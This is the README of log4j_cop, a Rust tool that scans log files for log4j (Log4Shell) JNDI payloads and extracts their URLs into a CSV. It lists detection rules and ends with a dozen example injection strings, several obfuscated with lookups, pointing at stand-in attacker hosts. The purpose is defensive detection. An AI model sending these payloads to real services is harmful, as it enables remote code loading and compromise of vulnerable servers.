# log4j_cop

Detects log4j payloads from a log file and optionally extracts URLs into a CSV file.

The CSV file will have two columns: `<URL>,<number of times URL showed up>`

## Usage

1. Build the binary

```
$ cargo build --release
```

2. Run

```
$ ./log4j_cop --help
log4j_cop 0.2
Bernardo de Araujo
Search logs for log4j payloads and optionally extract URLs.

USAGE:
    log4j_cop [OPTIONS] <LOG_FILE>

FLAGS:
    -h, --help       Prints help information
    -V, --version    Prints version information

OPTIONS:
    -u, --urls_output_path <urls_output_path>    When specified URLs will be extracted and persisted in CSV format

ARGS:
    <LOG_FILE>    Specifies the log file to be used
```

## Rules

Currently the following rules (and variants) are being accounted for:

- ${jndi:ldap://
- ${jndi:rmi://
- ${jndi:ldaps:/
- ${jndi:dns:/
- ${jndi:nis:/
- ${jndi:nds:/
- ${jndi:corba:/
- ${jndi:iiop:/

We are also taking into account:

- Mixed case payloads
- URL encoded payloads

## Algorithm

Each line is broken into characters and we run each character against characters from our rules.

1. For each rule, if a character matches the current character in that rule state machine we:
   - increment the state machine of that rule
   - otherwise the state remains the same
2. If the state machine of any rules reaches the end (every character in our rule is consumed):
   - return a match
   - otherwise return no match

## Examples of payloads being matched

```
${jndi:ldap://whatever.com/z}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```
